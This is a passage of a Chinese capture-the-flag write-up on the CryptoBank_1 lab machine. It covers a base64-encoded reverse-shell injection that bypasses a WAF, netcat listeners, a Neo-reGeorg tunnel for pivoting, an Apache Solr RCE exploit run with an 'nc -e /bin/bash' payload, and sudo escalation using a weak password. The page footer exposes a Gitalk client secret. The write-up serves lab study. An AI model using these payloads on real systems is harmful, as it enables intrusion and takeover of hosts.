bootstrap.min.css<br>        │   │   ├── bootstrap.min.css.map<br>        │   │   ├── bootstrap-theme.css<br>        │   │   ├── bootstrap-theme.css.map<br>        │   │   ├── bootstrap-theme.min.css<br>        │   │   ├── bootstrap-theme.min.css.map<br>        │   │   └── README.md<br>        │   ├── fonts<br>        │   │   ├── glyphicons-halflings-regular.eot<br>        │   │   ├── glyphicons-halflings-regular.svg<br>        │   │   ├── glyphicons-halflings-regular.ttf<br>        │   │   ├── glyphicons-halflings-regular.woff<br>        │   │   ├── glyphicons-halflings-regular.woff2<br>        │   │   └── README.md<br>        │   ├── jquery.js<br>        │   ├── js<br>        │   │   ├── bootstrap.js<br>        │   │   ├── bootstrap.min.js<br>        │   │   ├── npm.js<br>        │   │   └── README.md<br>        │   └── README.md<br>        ├── home.php<br>        ├── index.php<br>        ├── loan.jpg<br>        ├── login_auth.php<br>        ├── logo-top.png<br>        ├── logout.php<br>        ├── money_transfer.php<br>        ├── mysql_connect_init.php<br>        ├── style.css<br>        └── view_loans.php<br></code></pre></td></tr></table></figure>
+
+<p>在 <code>tools</code> 目录中是有命令执行的功能的，我们找一找这部分的源码</p>
+<p><img src="/pic/bfeb0a301396c4d878e1b2d6c25babfa_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>原来用户名就是命令，密码是 <code>wJWm4CgV26</code>。而这个密码与我们登录 <code>/development</code> 的密码是一致的。虽然还是有 WAF，但是尝试了 base64 编码后就绕过了。</p>
+<p><img src="/pic/861876911fd6c4e2a7d3996226464c27_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>URL 如下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>cryptobank.local<span class="hljs-regexp">/development/</span>tools<span class="hljs-regexp">/CommandExecution/</span>CommandExec.php?username=echo+<span class="hljs-string">&quot;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS4xMDEvNDQzIDA%2bJjE%3d&quot;</span>|+base64+-d|bash&amp;password=wJWm4CgV26<br></code></pre></td></tr></table></figure>
+
+<p>提前开启监听，然后访问网页反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.104] 43320<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1115): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@cryptobank:/var/www/cryptobank/development/tools/CommandExecution$ <span class="hljs-built_in">whoami</span><br>&lt;yptobank/development/tools/CommandExecution$ <span class="hljs-built_in">whoami</span>                        <br>www-data<br>www-data@cryptobank:/var/www/cryptobank/development/tools/CommandExecution$ <span class="hljs-built_in">id</span><br>&lt;w/cryptobank/development/tools/CommandExecution$ <span class="hljs-built_in">id</span>                        <br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@cryptobank:/var/www/cryptobank/development/tools/CommandExecution$ <span class="hljs-built_in">uname</span> -a<br>&lt;tobank/development/tools/CommandExecution$ <span class="hljs-built_in">uname</span> -a                        <br>Linux cryptobank 4.15.0-96-generic <span class="hljs-comment">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@cryptobank:/var/www/cryptobank/development/tools/CommandExecution$ ip a<br>&lt;cryptobank/development/tools/CommandExecution$ ip a                        <br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:1d:f7:35 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.1.104/24 brd 192.168.1.255 scope global dynamic enp0s3<br>       valid_lft 463sec preferred_lft 463sec<br>    inet6 fe80::a00:27ff:fe1d:f735/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:c0:de:21:af brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::42:c0ff:fede:21af/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>5: veth0fe9052@if4: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default <br>    <span class="hljs-built_in">link</span>/ether 52:5e:7e:9b:b6:d8 brd ff:ff:ff:ff:ff:ff link-netnsid 0<br>    inet6 fe80::505e:7eff:fe9b:b6d8/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure>
+
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>查看用户家目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@cryptobank:/var/www/cryptobank/development/tools/CommandExecution$ <span class="hljs-built_in">ls</span> -liah /home/cryptobank<br>&lt;t/tools/CommandExecution$ <span class="hljs-built_in">ls</span> -liah /home/cryptobank                        <br>total 52K<br>266998 drwxr-xr-x 5 cryptobank cryptobank 4.0K Apr 16  2020 .<br>131074 drwxr-xr-x 3 root       root       4.0K Apr 10  2020 ..<br>267039 -rw------- 1 cryptobank cryptobank   11 Apr 16  2020 .bash_history<br>267002 -rw-r--r-- 1 cryptobank cryptobank  220 Apr  4  2018 .bash_logout<br>267001 -rw-r--r-- 1 cryptobank cryptobank 3.7K Apr  4  2018 .bashrc<br>267026 drwx------ 2 cryptobank cryptobank 4.0K Apr 10  2020 .cache<br>267825 -rw-r--r-- 1 root       root         26 Apr 11  2020 .gitconfig<br>267028 drwx------ 3 cryptobank cryptobank 4.0K Apr 10  2020 .gnupg<br>267035 drwxrwxr-x 3 cryptobank cryptobank 4.0K Apr 10  2020 .<span class="hljs-built_in">local</span><br>267826 -rw------- 1 root       root       1.7K Apr 11  2020 .mysql_history<br>267000 -rw-r--r-- 1 cryptobank cryptobank  807 Apr  4  2018 .profile<br>267030 -rw-r--r-- 1 cryptobank cryptobank    0 Apr 10  2020 .sudo_as_admin_successful<br>267470 -rw-rw-r-- 1 cryptobank cryptobank  169 Apr 11  2020 .wget-hsts<br>263764 -rwxrwxrwx 1 cryptobank cryptobank   28 Apr 16  2020 flag.txt<br>www-data@cryptobank:/var/www/cryptobank/development/tools/CommandExecution$ <span class="hljs-built_in">cat</span> /home/cryptobank/flag.txt<br>&lt;ols/CommandExecution$ <span class="hljs-built_in">cat</span> /home/cryptobank/flag.txt                        <br>flag&#123;l4szl0h4ny3cz1smyh3r0&#125;<br></code></pre></td></tr></table></figure>
+
+<p>查看了常见的敏感文件和其文件权限、SUID 文件、定时任务、linpeas</p>
+<p>发现了这样一个进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">8983      3066  0.7 15.5 2676420 318132 ?      Ssl  07:41   2:36  |       _ /usr/local/openjdk-11/bin/java -server -Xms512m -Xmx512m -XX:+UseG1GC -XX:+PerfDisableSharedMem -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=250 -XX:+UseLargePages -XX:+AlwaysPreTouch -Xlog:gc*:file=/var/solr/logs/solr_gc.log:time,<span class="hljs-built_in">uptime</span>:filecount=9,filesize=20M -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=<span class="hljs-literal">false</span> -Dcom.sun.management.jmxremote.ssl=<span class="hljs-literal">false</span> -Dcom.sun.management.jmxremote.authenticate=<span class="hljs-literal">false</span> -Dcom.sun.management.jmxremote.port=18983 -Dcom.sun.management.jmxremote.rmi.port=18983 -Dsolr.log.dir=/var/solr/logs -Djetty.port=8983 -DSTOP.PORT=7983 -DSTOP.KEY=solrrocks -Duser.timezone=UTC -Djetty.home=/opt/solr/server -Dsolr.solr.home=/var/solr/data -Dsolr.data.home= -Dsolr.install.dir=/opt/solr -Dsolr.default.confdir=/opt/solr/server/solr/configsets/_default/conf -Dlog4j.configurationFile=file:/var/solr/log4j2.xml -Xss256k -Dsolr.jetty.https.port=8983 -jar start.jar --module=http<br></code></pre></td></tr></table></figure>
+
+<p>感觉有东西，看一看 netstat</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@cryptobank:/tmp$ netstat ano | grep 8983<br>netstat ano | grep 8983<br>tcp        0      0 cryptobank:54212        172.17.0.2:8983         CLOSE_WAIT<br></code></pre></td></tr></table></figure>
+
+<p>使用 <code>www-data@cryptobank:/tmp$ curl -L http://172.17.0.2:8983</code> 得到了回显</p>
+<h2 id="reGeorg-代理搭建"><a href="#reGeorg-代理搭建" class="headerlink" title="reGeorg 代理搭建"></a>reGeorg 代理搭建</h2><p>接下来我们需要搭建一个代理，以便本地使用浏览器访问目标网页</p>
+<p>经过搜索后我选择了这篇博客 <a target="_blank" rel="noopener" href="http://uuzdaisuki.com/2021/04/15/reGeorg%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">reGeorg内网穿透 - Leticia’s Blog (uuzdaisuki.com)</a></p>
+<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs verilog">git clone https:<span class="hljs-comment">//github.com/L-codes/Neo-reGeorg.git</span><br>python neoreg<span class="hljs-variable">.py</span> <span class="hljs-keyword">generate</span> -k password<br>生成tunnel文件，将对应的tunnel上传到网站可访问目录下<br>python3 neoreg<span class="hljs-variable">.py</span> -k password -u http:<span class="hljs-comment">//xx/tunnel.php</span><br>默认会开启本地<span class="hljs-number">1080</span>端口socks5,-p参数可指定端口，-l参数可指定监听地址<br></code></pre></td></tr></table></figure>
+
+<p>按照上述代码先生成 tunnel.php 文件（位于 <code>neoreg_servers</code> 文件夹中），然后上传到靶机中，进而复制到网站可访问的目录中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@cryptobank:/tmp$ <span class="hljs-built_in">cp</span> tunnel.php /var/www/cryptobank/tunnel.php<br><span class="hljs-built_in">cp</span> tunnel.php /var/www/cryptobank/tunnel.php<br></code></pre></td></tr></table></figure>
+
+<p>在本地开启 neoreg 链接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools/Neo-reGeorg]<br>└─$ python neoreg.py -k password -u http://cryptobank.local/tunnel.php<br>+------------------------------------------------------------------------+<br>  Log Level <span class="hljs-built_in">set</span> to [ERROR]<br>  Starting SOCKS5 server [127.0.0.1:1080]<br>  Tunnel at:<br>    http://cryptobank.local/tunnel.php<br>+------------------------------------------------------------------------+<br></code></pre></td></tr></table></figure>
+
+<p>使用浏览器添加 socks5 代理，访问 <code>http://172.17.0.2:8983/</code> 自动跳转到了以下界面</p>
+<p><img src="/pic/b9469dec28fbf3426642718b49ab157b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="solr-命令执行漏洞"><a href="#solr-命令执行漏洞" class="headerlink" title="solr 命令执行漏洞"></a>solr 命令执行漏洞</h2><p>搜索 solr 的漏洞</p>
+<p><img src="/pic/daa0a4dd8c1ff46ebc08e0d63b113f0c_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>添加 proxychains 代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ sudo vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/2f6fade69b268de917f4d8b87cec9382_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试使用代理执行 exp 脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ proxychains python 47572.py 172.17.0.2 8983 <span class="hljs-string">&#x27;whoami&#x27;</span>                           <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.16<br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>OS Realese: Linux, OS Version: 4.15.0-96-generic<br><span class="hljs-keyword">if</span> remote <span class="hljs-built_in">exec</span> failed, you should change your <span class="hljs-built_in">command</span> with right os platform<br><br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>Init node cryptobank Successfully, <span class="hljs-built_in">exec</span> <span class="hljs-built_in">command</span>=<span class="hljs-built_in">whoami</span><br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>RCE Successfully @Apache Solr node cryptobank<br>   solr<br></code></pre></td></tr></table></figure>
+
+<p>成功，提前开启监听，尝试反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ proxychains python 47572.py 172.17.0.2 8983 <span class="hljs-string">&#x27;nc 192.168.1.101 444 -e /bin/bash&#x27;</span>                     <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.16<br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>OS Realese: Linux, OS Version: 4.15.0-96-generic<br><span class="hljs-keyword">if</span> remote <span class="hljs-built_in">exec</span> failed, you should change your <span class="hljs-built_in">command</span> with right os platform<br><br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>Init node cryptobank Successfully, <span class="hljs-built_in">exec</span> <span class="hljs-built_in">command</span>=nc 192.168.1.101 444 -e /bin/bash<br>[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.17.0.2:8983  ...  OK<br>RCE failed @Apache Solr node cryptobank<br></code></pre></td></tr></table></figure>
+
+<p>反弹 shell 如果出了问题，那么请查看靶机的 docker 是否还在运行，我自己打靶过程中出现了 docker 掉了的情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ sudo nc -lvnp 444<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 444 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.104] 47398<br><span class="hljs-built_in">whoami</span><br>solr<br><span class="hljs-built_in">id</span><br>uid=8983(solr) gid=8983(solr) <span class="hljs-built_in">groups</span>=8983(solr),27(sudo)<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>solr@33fa86e6105f:/opt/solr/server$ sudo -l<br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> solr on 33fa86e6105f:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User solr may run the following commands on 33fa86e6105f:<br>    (ALL) NOPASSWD: ALL<br>    (ALL : ALL) ALL<br>solr@33fa86e6105f:/opt/solr/server$ sudo su       <br>sudo su<br>[sudo] password <span class="hljs-keyword">for</span> solr:<br></code></pre></td></tr></table></figure>
+
+<p>虽然用户权限比较明显，但是使用 sudo su 还是需要输入密码，不是很理解。</p>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>尝试了 root, solr 弱口令，在容器中继续寻找 flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">solr@33fa86e6105f:/opt/solr/server$ sudo su<br>sudo su<br>[sudo] password <span class="hljs-keyword">for</span> solr: solr<br><br>root@33fa86e6105f:/opt/solr-8.1.1/server<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@33fa86e6105f:~<span class="hljs-comment"># ls  </span><br><span class="hljs-built_in">ls</span><br>flag.txt<br>root@33fa86e6105f:~<span class="hljs-comment"># cat flag.txt    </span><br><span class="hljs-built_in">cat</span> flag.txt<br>Good job here our secure cold wallet flag&#123;s4t0sh1n4k4m0t0&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CryptoBank_1靶机</div>
+      <div>https://i3eg1nner.github.io/2023/10/67e28830d268.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/7f06b71ac96b.html" title="CyberSploit_2靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CyberSploit_2靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/be5fd2fbc403.html" title="CengBox_2 靶机">
+                        <span class="hidden-mobile">CengBox_2 靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '7327a68392dfb40cdea9ed9b9e237b0c'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
